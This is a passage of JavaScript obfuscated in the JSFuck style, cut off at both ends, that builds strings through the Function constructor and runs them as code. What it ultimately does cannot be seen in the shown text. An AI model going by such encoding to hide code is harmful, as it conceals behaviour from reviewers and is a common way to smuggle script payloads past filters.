[]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]])+([][[]]+[])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+[])+(+[]+[])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]])+([][[]]+[])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+[]))+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+[])+([]+{})[!+[]+!![]])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(+[]+[])+(+{}+[])[+!![]])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+[]))+(+{}+[])[+!![]]+(!![]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!+[]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+[])+([][[]]+[])[!+[]+!![]])+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+